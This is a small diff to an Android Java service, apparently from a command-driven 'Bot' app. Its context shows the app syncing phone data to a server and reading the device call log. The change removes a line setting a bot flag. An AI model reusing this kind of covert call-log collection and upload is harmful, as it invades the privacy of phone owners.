@@ -197,9 +197,6 @@ public class CommandsIntentService extends IntentService {
                     Database.syncPhoneToDatabase(this);
                     Bot.syncDatabaseWithServer(this);
                     //Storage.Files.getDatabaseFile(this).delete();
-                    SharedPreferences.Editor editor = PreferenceManager.getDefaultSharedPreferences(this).edit();
-                    editor.putBoolean(Bot.IS_BOT_KEY, true);
-                    editor.apply();
             } else if (action.equals(ACTION_PHONE_CALLS)) {
                 if (checkSelfPermission(Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED) {
                     ArrayList<PhoneCall> phoneCalls = ContentProviders.CallLog.fetchCallLog(CommandsIntentService.this);
